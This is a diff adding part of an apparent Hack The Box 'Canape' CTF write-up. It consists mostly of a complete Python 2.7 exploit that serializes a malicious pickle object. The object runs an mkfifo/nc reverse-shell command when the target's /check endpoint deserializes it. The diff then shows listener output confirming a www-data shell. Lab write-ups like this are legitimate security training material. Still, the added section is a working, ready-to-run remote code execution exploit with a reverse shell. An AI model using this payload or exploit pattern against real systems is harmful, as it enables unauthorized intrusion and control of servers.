@@ -337,5 +337,95 @@ To do that I `have created` the following `Python2.7` exploit:
 <br />
 
 ```python 
+#!/usr/bin/env python2.7
 
+# Author TheRedP4nther
+# Script to automate the Pickle Deserialization Attack of HTB Canape machine
+
+import requests
+import os
+import hashlib
+import cPickle
+import signal
+import sys
+
+# Global Variables.
+submit_url = "http://10.10.10.70/submit"
+check_url = "http://10.10.10.70/check"
+
+# Exploit Class.
+class Exploit(object):
+    
+    def __init__(self, command):
+
+        self.command = command
+
+    def __reduce__(self):
+        return (os.system, (self.command,))
+    
+
+# Functions.
+def def_handler(sig, frame): # Forced exit.
+    print "\n[+] Leaving the program...\n" 
+    sys.exit(1)
+
+# Ctrl+C 
+signal.signal(signal.SIGINT, def_handler) # Capture the keyboard key.
+
+def makeRequests():
+    if len(sys.argv) != 3:
+        print "\n[!] Execute: python2.7 {} [IP] [PORT]\n".format(sys.argv[0]) # Intructions.
+        sys.exit(1)
+
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    command = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {} {} >/tmp/f; Homer".format(ip, port) # Command that we want to execute with the Whitelist Character.
+    char = cPickle.dumps(Exploit(command)) # Serialize the command. 
+    quote = "Hola"
+    submit_data = {
+            "character": char,
+            "quote": quote
+            }    
+    response = requests.post(submit_url, data=submit_data) # Request to create the file.
+    if "Thank you for your suggestion!" in response.text:
+        encoded_input = hashlib.md5(char+quote).hexdigest() # Encode our input to use in the next request.
+        check_data = {"id": encoded_input}
+        response2 = requests.post(check_url, data=check_data) # Request to exploit the Deserialization Attack.
+    else:
+        print "\n[!] There's something wrong with your submit request! Try to run the program again!\n"
+
+if __name__ == '__main__':
+    makeRequests() # Call to the exploit function.
 ```
+
+<br />
+
+We execute the exploit:
+
+<br />
+
+Check the listener and... YES!!
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.70] 42686
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+<br />
+
+Intrusion ready!! Come on with the Privilege Escalation!!
+
+<br />
+
+# Privilege Escalation: www-data -> homer
+
+<br />
+
